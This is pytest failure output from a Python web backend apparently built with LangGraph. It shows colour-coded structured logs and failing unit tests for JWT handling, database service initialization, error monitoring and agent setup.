ERROR    app.core.logging:error_monitoring.py:120 [2m2025-07-05T14:23:43.962007Z[0m [[31m[1merror    [0m] [1merror_threshold_exceeded      [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_triggered[0m=[35mTrue[0m [36mcount[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_check_alert_threshold[0m [36mlineno[0m=[35m120[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mthreshold[0m=[35m100[0m [36mwindow_minutes[0m=[35m60[0m
ERROR    app.core.logging:error_monitoring.py:151 [2m2025-07-05T14:23:43.962054Z[0m [[31m[1merror    [0m] [1merror_alert_triggered         [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_message[0m=[35m'ALERT: High error rate detected\nError Type: error_type_48\nCount: 100 errors in 60 minutes\nAffected Paths: /api/endpoint_48, /api/endpoint_98\nStatus Codes: 448, 498, 548, 598\nFirst Occurrence: 2025-07-05T15:23:43.685956\nLast Occurrence: 2025-07-05T15:23:43.962001'[0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_trigger_alert[0m [36mlineno[0m=[35m151[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.962101Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4998'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_98[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m598[0m
ERROR    app.core.logging:error_monitoring.py:120 [2m2025-07-05T14:23:43.962151Z[0m [[31m[1merror    [0m] [1merror_threshold_exceeded      [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_triggered[0m=[35mTrue[0m [36mcount[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_check_alert_threshold[0m [36mlineno[0m=[35m120[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mthreshold[0m=[35m100[0m [36mwindow_minutes[0m=[35m60[0m
ERROR    app.core.logging:error_monitoring.py:151 [2m2025-07-05T14:23:43.962201Z[0m [[31m[1merror    [0m] [1merror_alert_triggered         [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_message[0m=[35m'ALERT: High error rate detected\nError Type: error_type_49\nCount: 100 errors in 60 minutes\nAffected Paths: /api/endpoint_49, /api/endpoint_99\nStatus Codes: 449, 499, 549, 599\nFirst Occurrence: 2025-07-05T15:23:43.686006\nLast Occurrence: 2025-07-05T15:23:43.962145'[0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_trigger_alert[0m [36mlineno[0m=[35m151[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.962315Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4999'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_99[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m599[0m
____ TestCreateAccessToken.test_create_access_token_includes_sanitized_jti _____
tests/unit/test_auth_utils.py:80: in test_create_access_token_includes_sanitized_jti
    assert "&lt;script&gt;" in payload["jti"]
E   AssertionError: assert '&lt;script&gt;' in 'test-thread--1751725425.761023'
___________________ TestVerifyToken.test_verify_token_valid ____________________
tests/unit/test_auth_utils.py:96: in test_verify_token_valid
    token = create_access_token(thread_id)
app/utils/auth.py:35: in create_access_token
    expire = datetime.now(UTC) + timedelta(days=settings.JWT_ACCESS_TOKEN_EXPIRE_DAYS)
E   TypeError: unsupported type for timedelta days component: MagicMock
_______________ TestVerifyToken.test_verify_token_invalid_format _______________
tests/unit/test_auth_utils.py:114: in test_verify_token_invalid_format
    with pytest.raises(ValueError, match="Token must be a non-empty string|Token format is invalid"):
E   Failed: DID NOT RAISE <class 'ValueError'>
------------------------------ Captured log call -------------------------------
WARNING  app.core.logging:auth.py:64 [2m2025-07-05T14:23:45.768345Z[0m [[33m[1mwarning  [0m] [1mtoken_invalid_format          [0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35mauth.py[0m [36mfunc_name[0m=[35mverify_token[0m [36mlineno[0m=[35m64[0m [36mmodule[0m=[35mauth[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/utils/auth.py[0m
WARNING  app.core.logging:auth.py:64 [2m2025-07-05T14:23:45.768507Z[0m [[33m[1mwarning  [0m] [1mtoken_invalid_format          [0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35mauth.py[0m [36mfunc_name[0m=[35mverify_token[0m [36mlineno[0m=[35m64[0m [36mmodule[0m=[35mauth[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/utils/auth.py[0m
WARNING  app.core.logging:auth.py:70 [2m2025-07-05T14:23:45.768609Z[0m [[33m[1mwarning  [0m] [1mtoken_suspicious_format       [0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35mauth.py[0m [36mfunc_name[0m=[35mverify_token[0m [36mlineno[0m=[35m70[0m [36mmodule[0m=[35mauth[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/utils/auth.py[0m
ERROR    app.core.logging:auth.py:84 [2m2025-07-05T14:23:45.768694Z[0m [[31m[1merror    [0m] [1mtoken_verification_failed     [0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36merror[0m=[35m"Invalid header string: 'utf-8' codec can't decode byte 0x9e in position 0: invalid start byte"[0m [36mfilename[0m=[35mauth.py[0m [36mfunc_name[0m=[35mverify_token[0m [36mlineno[0m=[35m84[0m [36mmodule[0m=[35mauth[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/utils/auth.py[0m
_____________ TestVerifyToken.test_verify_token_invalid_signature ______________
tests/unit/test_auth_utils.py:124: in test_verify_token_invalid_signature
    token = create_access_token("test-thread")
app/utils/auth.py:35: in create_access_token
    expire = datetime.now(UTC) + timedelta(days=settings.JWT_ACCESS_TOKEN_EXPIRE_DAYS)
E   TypeError: unsupported type for timedelta days component: MagicMock
___________ TestAuthUtilsLogging.test_verify_token_logs_verification ___________
tests/unit/test_auth_utils.py:220: in test_verify_token_logs_verification
    token = create_access_token(thread_id)
app/utils/auth.py:35: in create_access_token
    expire = datetime.now(UTC) + timedelta(days=settings.JWT_ACCESS_TOKEN_EXPIRE_DAYS)
E   TypeError: unsupported type for timedelta days component: MagicMock
____________ TestAuthUtilsLogging.test_verify_token_logs_jwt_error _____________
tests/unit/test_auth_utils.py:246: in test_verify_token_logs_jwt_error
    token = create_access_token("test")
app/utils/auth.py:35: in create_access_token
    expire = datetime.now(UTC) + timedelta(days=settings.JWT_ACCESS_TOKEN_EXPIRE_DAYS)
E   TypeError: unsupported type for timedelta days component: MagicMock
__________ TestDatabaseServiceInitialization.test_initialize_success ___________
tests/unit/test_database_service.py:56: in test_initialize_success
    await service.initialize()
app/services/database.py:82: in initialize
    await self._test_connection()
app/services/database.py:98: in _test_connection
    async with self._engine.begin() as conn:
E   TypeError: 'coroutine' object does not support the asynchronous context manager protocol
------------------------------ Captured log call -------------------------------
WARNING  app.core.logging:database.py:89 [2m2025-07-05T14:23:45.792934Z[0m [[33m[1mwarning  [0m] [1mDatabase initialization attempt 1 failed: 'coroutine' object does not support the asynchronous context manager protocol[0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35mdatabase.py[0m [36mfunc_name[0m=[35minitialize[0m [36mlineno[0m=[35m89[0m [36mmodule[0m=[35mdatabase[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/services/database.py[0m
WARNING  app.core.logging:database.py:89 [2m2025-07-05T14:23:46.793703Z[0m [[33m[1mwarning  [0m] [1mDatabase initialization attempt 2 failed: 'coroutine' object does not support the asynchronous context manager protocol[0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35mdatabase.py[0m [36mfunc_name[0m=[35minitialize[0m [36mlineno[0m=[35m89[0m [36mmodule[0m=[35mdatabase[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/services/database.py[0m
WARNING  app.core.logging:database.py:89 [2m2025-07-05T14:23:48.795543Z[0m [[33m[1mwarning  [0m] [1mDatabase initialization attempt 3 failed: 'coroutine' object does not support the asynchronous context manager protocol[0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35mdatabase.py[0m [36mfunc_name[0m=[35minitialize[0m [36mlineno[0m=[35m89[0m [36mmodule[0m=[35mdatabase[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/services/database.py[0m
ERROR    app.core.logging:database.py:93 [2m2025-07-05T14:23:48.795747Z[0m [[31m[1merror    [0m] [1mFailed to initialize database service after 3 attempts[0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35mdatabase.py[0m [36mfunc_name[0m=[35minitialize[0m [36mlineno[0m=[35m93[0m [36mmodule[0m=[35mdatabase[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/services/database.py[0m
______ TestDatabaseServiceInitialization.test_initialize_test_environment ______
tests/unit/test_database_service.py:86: in test_initialize_test_environment
    await service.initialize()
app/services/database.py:82: in initialize
    await self._test_connection()
app/services/database.py:98: in _test_connection
    async with self._engine.begin() as conn:
E   TypeError: 'coroutine' object does not support the asynchronous context manager protocol
------------------------------ Captured log call -------------------------------
WARNING  app.core.logging:database.py:89 [2m2025-07-05T14:23:48.810243Z[0m [[33m[1mwarning  [0m] [1mDatabase initialization attempt 1 failed: 'coroutine' object does not support the asynchronous context manager protocol[0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35mdatabase.py[0m [36mfunc_name[0m=[35minitialize[0m [36mlineno[0m=[35m89[0m [36mmodule[0m=[35mdatabase[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/services/database.py[0m
WARNING  app.core.logging:database.py:89 [2m2025-07-05T14:23:49.811411Z[0m [[33m[1mwarning  [0m] [1mDatabase initialization attempt 2 failed: 'coroutine' object does not support the asynchronous context manager protocol[0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35mdatabase.py[0m [36mfunc_name[0m=[35minitialize[0m [36mlineno[0m=[35m89[0m [36mmodule[0m=[35mdatabase[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/services/database.py[0m
WARNING  app.core.logging:database.py:89 [2m2025-07-05T14:23:51.813606Z[0m [[33m[1mwarning  [0m] [1mDatabase initialization attempt 3 failed: 'coroutine' object does not support the asynchronous context manager protocol[0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35mdatabase.py[0m [36mfunc_name[0m=[35minitialize[0m [36mlineno[0m=[35m89[0m [36mmodule[0m=[35mdatabase[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/services/database.py[0m
ERROR    app.core.logging:database.py:93 [2m2025-07-05T14:23:51.813800Z[0m [[31m[1merror    [0m] [1mFailed to initialize database service after 3 attempts[0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35mdatabase.py[0m [36mfunc_name[0m=[35minitialize[0m [36mlineno[0m=[35m93[0m [36mmodule[0m=[35mdatabase[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/services/database.py[0m
________ TestDatabaseServiceInitialization.test_initialize_with_retries ________
tests/unit/test_database_service.py:116: in test_initialize_with_retries
    await service.initialize()
app/services/database.py:82: in initialize
    await self._test_connection()
app/services/database.py:98: in _test_connection
    async with self._engine.begin() as conn:
E   TypeError: 'coroutine' object does not support the asynchronous context manager protocol
------------------------------ Captured log call -------------------------------
WARNING  app.core.logging:database.py:89 [2m2025-07-05T14:23:51.829440Z[0m [[33m[1mwarning  [0m] [1mDatabase initialization attempt 1 failed: Connection failed[0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35mdatabase.py[0m [36mfunc_name[0m=[35minitialize[0m [36mlineno[0m=[35m89[0m [36mmodule[0m=[35mdatabase[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/services/database.py[0m
WARNING  app.core.logging:database.py:89 [2m2025-07-05T14:23:51.829684Z[0m [[33m[1mwarning  [0m] [1mDatabase initialization attempt 2 failed: Connection failed[0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35mdatabase.py[0m [36mfunc_name[0m=[35minitialize[0m [36mlineno[0m=[35m89[0m [36mmodule[0m=[35mdatabase[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/services/database.py[0m
WARNING  app.core.logging:database.py:89 [2m2025-07-05T14:23:51.829810Z[0m [[33m[1mwarning  [0m] [1mDatabase initialization attempt 3 failed: 'coroutine' object does not support the asynchronous context manager protocol[0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35mdatabase.py[0m [36mfunc_name[0m=[35minitialize[0m [36mlineno[0m=[35m89[0m [36mmodule[0m=[35mdatabase[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/services/database.py[0m
ERROR    app.core.logging:database.py:93 [2m2025-07-05T14:23:51.829867Z[0m [[31m[1merror    [0m] [1mFailed to initialize database service after 3 attempts[0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35mdatabase.py[0m [36mfunc_name[0m=[35minitialize[0m [36mlineno[0m=[35m93[0m [36mmodule[0m=[35mdatabase[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/services/database.py[0m
_ TestDatabaseServiceSessionManagement.test_get_session_initializes_if_needed __
../.local/share/uv/python/cpython-3.13.5-linux-x86_64-gnu/lib/python3.13/unittest/mock.py:958: in assert_called_once
    raise AssertionError(msg)
E   AssertionError: Expected 'initialize' to have been called once. Called 0 times.

During handling of the above exception, another exception occurred:
tests/unit/test_database_service.py:199: in test_get_session_initializes_if_needed
    mock_init.assert_called_once()
E   AssertionError: Expected 'initialize' to have been called once. Called 0 times.
_ TestDatabaseServiceSessionManagement.test_get_session_operational_error_handling _
tests/unit/test_database_service.py:219: in test_get_session_operational_error_handling
    async with pytest.raises(OperationalError):
E   TypeError: 'RaisesContext' object does not support the asynchronous context manager protocol
_ TestDatabaseServiceSessionManagement.test_get_session_sqlalchemy_error_handling _
tests/unit/test_database_service.py:241: in test_get_session_sqlalchemy_error_handling
    async with pytest.raises(SQLAlchemyError):
E   TypeError: 'RaisesContext' object does not support the asynchronous context manager protocol
_ TestDatabaseServiceSessionManagement.test_get_session_generic_error_handling _
tests/unit/test_database_service.py:261: in test_get_session_generic_error_handling
    async with pytest.raises(Exception, match="Generic error"):
E   TypeError: 'RaisesContext' object does not support the asynchronous context manager protocol
___________ TestDatabaseServiceHealthCheck.test_health_check_healthy ___________
tests/unit/test_database_service.py:295: in test_health_check_healthy
    assert health["status"] == "healthy"
E   AssertionError: assert 'unhealthy' == 'healthy'
E     
E     - healthy
E     + unhealthy
E     ? ++
------------------------------ Captured log call -------------------------------
ERROR    app.core.logging:database.py:178 [2m2025-07-05T14:23:54.903947Z[0m [[31m[1merror    [0m] [1mDatabase health check failed: 'NoneType' object has no attribute 'pool'[0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35mdatabase.py[0m [36mfunc_name[0m=[35mhealth_check[0m [36mlineno[0m=[35m178[0m [36mmodule[0m=[35mdatabase[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/services/database.py[0m
____ TestDatabaseServiceHealthCheck.test_health_check_initializes_if_needed ____
../.local/share/uv/python/cpython-3.13.5-linux-x86_64-gnu/lib/python3.13/unittest/mock.py:958: in assert_called_once
    raise AssertionError(msg)
E   AssertionError: Expected 'initialize' to have been called once. Called 0 times.

During handling of the above exception, another exception occurred:
tests/unit/test_database_service.py:384: in test_health_check_initializes_if_needed
    mock_init.assert_called_once()
E   AssertionError: Expected 'initialize' to have been called once. Called 0 times.
------------------------------ Captured log call -------------------------------
ERROR    app.core.logging:database.py:178 [2m2025-07-05T14:23:54.914907Z[0m [[31m[1merror    [0m] [1mDatabase health check failed: 'NoneType' object has no attribute 'pool'[0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35mdatabase.py[0m [36mfunc_name[0m=[35mhealth_check[0m [36mlineno[0m=[35m178[0m [36mmodule[0m=[35mdatabase[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/services/database.py[0m
__ TestDatabaseServiceSingleton.test_database_service_singleton_configuration __
tests/unit/test_database_service.py:515: in test_database_service_singleton_configuration
    assert database_service._initialized is False
E   assert True is False
E    +  where True = <app.services.database.DatabaseService object at 0x7bf5ff13acf0>._initialized
_____ TestDatabaseServiceErrorHandling.test_session_error_during_operation _____
../.local/share/uv/python/cpython-3.13.5-linux-x86_64-gnu/lib/python3.13/unittest/mock.py:958: in assert_called_once
    raise AssertionError(msg)
E   AssertionError: Expected 'rollback' to have been called once. Called 0 times.

During handling of the above exception, another exception occurred:
tests/unit/test_database_service.py:544: in test_session_error_during_operation
    mock_session.rollback.assert_called_once()
E   AssertionError: Expected 'rollback' to have been called once. Called 0 times.
_ TestDatabaseServiceErrorHandling.test_connection_recovery_after_operational_error _
../.local/share/uv/python/cpython-3.13.5-linux-x86_64-gnu/lib/python3.13/unittest/mock.py:958: in assert_called_once
    raise AssertionError(msg)
E   AssertionError: Expected 'rollback' to have been called once. Called 0 times.

During handling of the above exception, another exception occurred:
tests/unit/test_database_service.py:570: in test_connection_recovery_after_operational_error
    mock_session.rollback.assert_called_once()
E   AssertionError: Expected 'rollback' to have been called once. Called 0 times.
____ TestDatabaseServiceConfigurationVariants.test_debug_mode_configuration ____
tests/unit/test_database_service.py:658: in test_debug_mode_configuration
    await service.initialize()
app/services/database.py:82: in initialize
    await self._test_connection()
app/services/database.py:98: in _test_connection
    async with self._engine.begin() as conn:
E   TypeError: 'coroutine' object does not support the asynchronous context manager protocol
------------------------------ Captured log call -------------------------------
WARNING  app.core.logging:database.py:89 [2m2025-07-05T14:23:55.027513Z[0m [[33m[1mwarning  [0m] [1mDatabase initialization attempt 1 failed: 'coroutine' object does not support the asynchronous context manager protocol[0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35mdatabase.py[0m [36mfunc_name[0m=[35minitialize[0m [36mlineno[0m=[35m89[0m [36mmodule[0m=[35mdatabase[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/services/database.py[0m
WARNING  app.core.logging:database.py:89 [2m2025-07-05T14:23:56.028681Z[0m [[33m[1mwarning  [0m] [1mDatabase initialization attempt 2 failed: 'coroutine' object does not support the asynchronous context manager protocol[0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35mdatabase.py[0m [36mfunc_name[0m=[35minitialize[0m [36mlineno[0m=[35m89[0m [36mmodule[0m=[35mdatabase[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/services/database.py[0m
WARNING  app.core.logging:database.py:89 [2m2025-07-05T14:23:58.030794Z[0m [[33m[1mwarning  [0m] [1mDatabase initialization attempt 3 failed: 'coroutine' object does not support the asynchronous context manager protocol[0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35mdatabase.py[0m [36mfunc_name[0m=[35minitialize[0m [36mlineno[0m=[35m89[0m [36mmodule[0m=[35mdatabase[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/services/database.py[0m
ERROR    app.core.logging:database.py:93 [2m2025-07-05T14:23:58.031020Z[0m [[31m[1merror    [0m] [1mFailed to initialize database service after 3 attempts[0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35mdatabase.py[0m [36mfunc_name[0m=[35minitialize[0m [36mlineno[0m=[35m93[0m [36mmodule[0m=[35mdatabase[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/services/database.py[0m
_ TestDatabaseServiceConfigurationVariants.test_production_mode_configuration __
tests/unit/test_database_service.py:683: in test_production_mode_configuration
    await service.initialize()
app/services/database.py:82: in initialize
    await self._test_connection()
app/services/database.py:98: in _test_connection
    async with self._engine.begin() as conn:
E   TypeError: 'coroutine' object does not support the asynchronous context manager protocol
------------------------------ Captured log call -------------------------------
WARNING  app.core.logging:database.py:89 [2m2025-07-05T14:23:58.044535Z[0m [[33m[1mwarning  [0m] [1mDatabase initialization attempt 1 failed: 'coroutine' object does not support the asynchronous context manager protocol[0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35mdatabase.py[0m [36mfunc_name[0m=[35minitialize[0m [36mlineno[0m=[35m89[0m [36mmodule[0m=[35mdatabase[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/services/database.py[0m
WARNING  app.core.logging:database.py:89 [2m2025-07-05T14:23:59.045099Z[0m [[33m[1mwarning  [0m] [1mDatabase initialization attempt 2 failed: 'coroutine' object does not support the asynchronous context manager protocol[0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35mdatabase.py[0m [36mfunc_name[0m=[35minitialize[0m [36mlineno[0m=[35m89[0m [36mmodule[0m=[35mdatabase[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/services/database.py[0m
WARNING  app.core.logging:database.py:89 [2m2025-07-05T14:24:01.047375Z[0m [[33m[1mwarning  [0m] [1mDatabase initialization attempt 3 failed: 'coroutine' object does not support the asynchronous context manager protocol[0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35mdatabase.py[0m [36mfunc_name[0m=[35minitialize[0m [36mlineno[0m=[35m89[0m [36mmodule[0m=[35mdatabase[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/services/database.py[0m
ERROR    app.core.logging:database.py:93 [2m2025-07-05T14:24:01.047578Z[0m [[31m[1merror    [0m] [1mFailed to initialize database service after 3 attempts[0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35mdatabase.py[0m [36mfunc_name[0m=[35minitialize[0m [36mlineno[0m=[35m93[0m [36mmodule[0m=[35mdatabase[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/services/database.py[0m
_ TestDatabaseServiceAdvancedOperations.test_create_user_with_duplicate_email __
../.local/share/uv/python/cpython-3.13.5-linux-x86_64-gnu/lib/python3.13/unittest/mock.py:958: in assert_called_once
    raise AssertionError(msg)
E   AssertionError: Expected 'rollback' to have been called once. Called 0 times.

During handling of the above exception, another exception occurred:
tests/unit/test_database_service.py:720: in test_create_user_with_duplicate_email
    mock_session.rollback.assert_called_once()
E   AssertionError: Expected 'rollback' to have been called once. Called 0 times.
___ TestDatabaseServiceAdvancedOperations.test_database_transaction_rollback ___
../.local/share/uv/python/cpython-3.13.5-linux-x86_64-gnu/lib/python3.13/unittest/mock.py:958: in assert_called_once
    raise AssertionError(msg)
E   AssertionError: Expected 'rollback' to have been called once. Called 0 times.

During handling of the above exception, another exception occurred:
tests/unit/test_database_service.py:750: in test_database_transaction_rollback
    mock_session.rollback.assert_called_once()
E   AssertionError: Expected 'rollback' to have been called once. Called 0 times.
____ TestDatabaseServiceAdvancedOperations.test_database_connection_timeout ____
../.local/share/uv/python/cpython-3.13.5-linux-x86_64-gnu/lib/python3.13/unittest/mock.py:958: in assert_called_once
    raise AssertionError(msg)
E   AssertionError: Expected 'rollback' to have been called once. Called 0 times.

During handling of the above exception, another exception occurred:
tests/unit/test_database_service.py:798: in test_database_connection_timeout
    mock_session.rollback.assert_called_once()
E   AssertionError: Expected 'rollback' to have been called once. Called 0 times.
________ TestDatabaseServiceLegacyMethods.test_get_session_maker_method ________
tests/unit/test_database_service.py:851: in test_get_session_maker_method
    result = service.get_session_maker()
app/services/database.py:378: in get_session_maker
    raise RuntimeError("Database service not initialized")
E   RuntimeError: Database service not initialized
______ TestErrorMonitorEdgeCases.test_window_edge_case_exactly_at_cutoff _______
tests/unit/test_error_monitoring.py:464: in test_window_edge_case_exactly_at_cutoff
    assert len(monitor.error_counts["test_error"]) == 1
E   assert 2 == 1
E    +  where 2 = len(deque([datetime.datetime(2023, 1, 1, 11, 0), datetime.datetime(2023, 1, 1, 12, 0)]))
------------------------------ Captured log call -------------------------------
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:24:01.184796Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m1[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35mNone[0m [36merror_type[0m=[35mtest_error[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/test[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m400[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:24:01.184899Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m2[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35mNone[0m [36merror_type[0m=[35mtest_error[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/test[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m400[0m
____________ TestBoardroomException.test_boardroom_exception_basic _____________
tests/unit/test_exceptions.py:44: in test_boardroom_exception_basic
    assert exception.error_code == "BOARDROOM_ERROR"
E   AssertionError: assert 'LANGGRAPH_ERROR' == 'BOARDROOM_ERROR'
E     
E     - BOARDROOM_ERROR
E     + LANGGRAPH_ERROR
_____________ TestLangGraphAgent.test_get_model_kwargs_development _____________
tests/unit/test_langgraph_graph.py:72: in test_get_model_kwargs_development
    agent = LangGraphAgent()
app/core/langgraph/graph.py:84: in __init__
    self.llm = ChatOpenAI(
.venv/lib/python3.13/site-packages/langchain_core/load/serializable.py:130: in __init__
    super().__init__(*args, **kwargs)
E   pydantic_core._pydantic_core.ValidationError: 2 validation errors for ChatOpenAI
E   model
E     Input should be a valid string [type=string_type, input_value=<MagicMock name='settings...L' id='136296297666208'>, input_type=MagicMock]
E       For further information visit https://errors.pydantic.dev/2.11/v/string_type
E   api_key
E     Input should be a valid string [type=string_type, input_value=<MagicMock name='settings...Y' id='136296297661504'>, input_type=MagicMock]
E       For further information visit https://errors.pydantic.dev/2.11/v/string_type
_____________ TestLangGraphAgent.test_get_model_kwargs_production ______________
tests/unit/test_langgraph_graph.py:84: in test_get_model_kwargs_production
    agent = LangGraphAgent()
app/core/langgraph/graph.py:84: in __init__
    self.llm = ChatOpenAI(
.venv/lib/python3.13/site-packages/langchain_core/load/serializable.py:130: in __init__
    super().__init__(*args, **kwargs)
E   pydantic_core._pydantic_core.ValidationError: 2 validation errors for ChatOpenAI
E   model
E     Input should be a valid string [type=string_type, input_value=<MagicMock name='settings...L' id='136296087587536'>, input_type=MagicMock]
E       For further information visit https://errors.pydantic.dev/2.11/v/string_type
E   api_key
E     Input should be a valid string [type=string_type, input_value=<MagicMock name='settings...Y' id='136296087594256'>, input_type=MagicMock]
E       For further information visit https://errors.pydantic.dev/2.11/v/string_type
